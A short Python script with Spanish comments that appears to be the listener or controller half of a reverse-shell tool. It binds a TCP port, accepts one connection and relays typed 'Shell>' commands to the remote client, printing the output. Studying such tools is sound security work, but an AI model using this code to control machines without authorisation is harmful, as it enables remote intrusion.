import socket
import sys

# Server
bind_ip = "192.168.1.114" # Direccion IP del servidor
bind_port = 8080 # Puerto a utilizar

# Funcion que envia los comandos al cliente
def send_commands(conn):
    while True:
        # Entrada de comandos
        cmd = input("Shell> ")

        # terminate - termina la conexion
        if cmd == 'terminate':
            conn.send(b'terminate')
            conn.close()
            server.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            # Envia el comando al cliente
            conn.send(str.encode(cmd))
            # Se recibe la respuesta del cliente
            client_response = conn.recv(4096).decode("utf-8")
            # Imprimir en pantalla la respuesta
            print(client_response)

# Se crea el socket TCP IPv4
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
# Define donde estara el servidor
server.bind((bind_ip, bind_port))
# Define el numero de conexiones a recibir
server.listen(1)

print ("[*] Escucha en %s:%d" % (bind_ip,bind_port))

# Acepta la conexion
conn,addr = server.accept()
print('Conexion aceptada de %s y el puerto %d' % (addr[0],addr[1]))
print("Shell iniciada")

# Se comienza a enviar comandos
send_commands(conn)
conn.close()